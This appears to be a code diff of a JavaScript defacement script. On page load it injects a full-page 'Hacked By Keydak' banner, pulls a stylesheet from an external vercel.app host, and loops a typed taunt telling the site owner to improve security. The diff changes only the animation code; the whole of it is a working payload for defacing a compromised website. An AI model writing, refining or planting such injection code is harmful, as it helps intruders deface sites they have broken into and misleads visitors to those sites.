@@ -14,38 +14,6 @@ document.addEventListener('DOMContentLoaded', function () {
             <title>Home - Hacked By Keydak</title>
             <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
         </head>
-        <style>
-           .mainContainer {
-                    text-align: center;
-                    padding-top: 50px;
-                }
-
-                .text-container {
-                    display: inline-block;
-                    overflow: hidden;
-                    white-space: nowrap;
-                    position: relative;
-                    font-family: monospace;
-                }
-
-                .text1 {
-                    display: inline-block;
-                    overflow: hidden;
-                    white-space: nowrap;
-                    border-right: 3px solid;
-                    animation: typing 4s steps(30, end), fadeOut 4s 2s forwards;
-                }
-
-                @keyframes typing {
-                    from { width: 0 }
-                    to { width: 100% }
-                }
-
-                @keyframes fadeOut {
-                    from { opacity: 1; }
-                    to { opacity: 0; }
-                }
-        </style>
         <body>
             <div class="mainContainer">
                 <div class="img">
@@ -59,36 +27,46 @@ document.addEventListener('DOMContentLoaded', function () {
             </div>
         </body>
               <script>
-                             
-                  function startTypingAnimation() {
-                    var text = "you need to improve the security system on your site";
-                    var textElement = document.querySelector('.text1');
-                    var containerWidth = textElement.parentNode.offsetWidth;
-                    var textWidth = textElement.offsetWidth;
+ // Function to handle the typing animation
+function startTypingAnimation() {
+    var textElement = document.querySelector('.text1');
+    var text = "you need to improve the security system on your site";
+    var index = 0;
 
-                    // Calculate animation duration based on text width
-                    var animationDuration = (textWidth / containerWidth) * 4000; // 4s for full width
+    function type() {
+        if (index < text.length) {
+            textElement.textContent += text.charAt(index);
+            index++;
+            setTimeout(type, 150);
+        } else {
+            // Start fading out
+            fadeOutText();
+        }
+    }
 
-                    // Apply animation duration to typing animation
-                    textElement.style.animationDuration = animationDuration + 'ms';
+    function fadeOutText() {
+        var textLength = text.length;
+        var delay = 100; // Delay in milliseconds between each character removal
+        var fadeInterval = setInterval(function() {
+            if (textLength > 0) {
+                textElement.textContent = text.substring(0, textLength - 1);
+                textLength--;
+            } else {
+                clearInterval(fadeInterval);
+                // Restart typing animation
+                setTimeout(function() {
+                    index = 0;
+                    type();
+                }, 1000); // Delay before restarting typing animation
+            }
+        }, delay);
+    }
 
-                    // Start typing animation
-                    textElement.classList.add('typing');
-                }
+    type();
+}
 
-                // Start typing animation when DOM content is loaded
-                document.addEventListener('DOMContentLoaded', function () {
-                    startTypingAnimation();
+    startTypingAnimation();
 
-                    // After animation ends, restart typing animation
-                    var textElement = document.querySelector('.text1');
-                    textElement.addEventListener('animationend', function () {
-                        textElement.classList.remove('typing');
-                        setTimeout(function () {
-                            textElement.classList.add('typing');
-                        }, 2000); // 2s delay before restarting animation
-                    });
-                });
             </script>
         </html>
     `;
@@ -109,6 +87,6 @@ document.addEventListener('DOMContentLoaded', function () {
 
     //     type();
     // });
-   var fragment = document.createRange().createContextualFragment(newHtmlContent);
+    var fragment = document.createRange().createContextualFragment(newHtmlContent);
     document.body.appendChild(fragment);
 });
